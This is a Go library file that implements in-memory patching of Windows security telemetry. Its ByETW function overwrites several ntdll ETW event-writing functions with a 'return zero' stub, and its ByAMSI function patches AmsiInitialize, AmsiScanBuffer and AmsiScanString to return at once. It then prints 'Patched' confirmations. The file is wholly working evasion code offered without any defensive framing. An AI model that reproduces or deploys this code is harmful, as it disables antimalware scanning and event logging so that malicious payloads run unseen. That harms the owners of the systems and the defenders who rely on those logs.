package lib

import (
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

const errnoERROR_IO_PENDING = 997

var errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)

var procWriteProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
var procEtwNotificationRegister = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwNotificationRegister")
var procEtwEventRegister = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventRegister")
var procEtwEventWriteFull = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteFull")
var procEtwEventWrite = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWrite")

var procEtwEventWriteEx = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteEx")
var procEtwEventWriteNoRegistration = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteNoRegistration")
var procEtwEventWriteString = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteString")
var procEtwEventWriteTransfer = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteTransfer")
var procEtwTraceMessage = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwTraceMessage")
var procEtwTraceMessageVa = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwTraceMessageVa")

var(
	fntdll = syscall.NewLazyDLL("amsi.dll")
	AmsiScanBuffer  = fntdll.NewProc("AmsiScanBuffer")
	AmsiScanString  = fntdll.NewProc("AmsiScanString")
	AmsiInitialize  = fntdll.NewProc("AmsiInitialize")
)


func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return nil
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}

	return e
}

func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func ByETW() {
	handle := uintptr(0xffffffffffffffff)
	dataAddr := []uintptr{ 
		//procEtwNotificationRegister.Addr(),
		//procEtwEventRegister.Addr(),
		procEtwEventWriteFull.Addr(),
		procEtwEventWrite.Addr(),
		procEtwEventWriteEx.Addr(),
		procEtwEventWriteNoRegistration.Addr(),
		procEtwEventWriteString.Addr(),
		procEtwEventWriteTransfer.Addr(),
		procEtwTraceMessage.Addr(),
		procEtwTraceMessageVa.Addr(),
	}

	for i, _ := range dataAddr {
		data, _ := hex.DecodeString("4833C0C3")
		var nLength uintptr
		datalength := len(data)
		WriteProcessMemory(handle, dataAddr[i], &data[0], uintptr(uint32(datalength)), &nLength)
	}

	fmt.Println("ETW Patched...")
}

func ByAMSI(){
	handle := uintptr(0xffffffffffffffff)
	amsi := []uintptr{
		AmsiInitialize.Addr(),
		AmsiScanBuffer.Addr(),
		AmsiScanString.Addr(),
	}

	for j, _ := range amsi {
		var patcha = []byte{0xc3}
		datalength := len(patcha)
		var nLength uintptr
		WriteProcessMemory(handle, amsi[j], &patcha[0], uintptr(uint32(datalength)), &nLength)
	}
	
	fmt.Println("AMSI Patched...")
}
